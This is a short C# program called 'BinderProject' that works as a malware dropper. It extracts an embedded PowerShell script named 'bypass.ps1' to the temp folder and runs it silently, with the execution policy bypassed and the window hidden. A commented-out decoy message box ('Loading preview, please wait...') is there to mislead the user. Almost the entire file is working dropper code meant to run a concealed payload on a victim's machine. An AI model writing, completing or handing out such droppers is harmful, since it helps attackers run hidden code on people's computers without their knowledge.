using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace BinderProject
{
    class Program
    {
        static void Main(string[] args)
        {
            // Extract the embedded PowerShell script to temp
            string tempPath = Path.Combine(Path.GetTempPath(), "bypass.ps1");
            using (Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream("BinderProject.bypass.ps1"))
            using (FileStream fs = new FileStream(tempPath, FileMode.Create))
            {
                s.CopyTo(fs);
            }

            // Run it silently via powershell
            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + tempPath + "\"",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            Process.Start(psi);

            // Fake decoy - Optional
            // System.Windows.Forms.MessageBox.Show("Loading preview, please wait...");
        }
    }
}
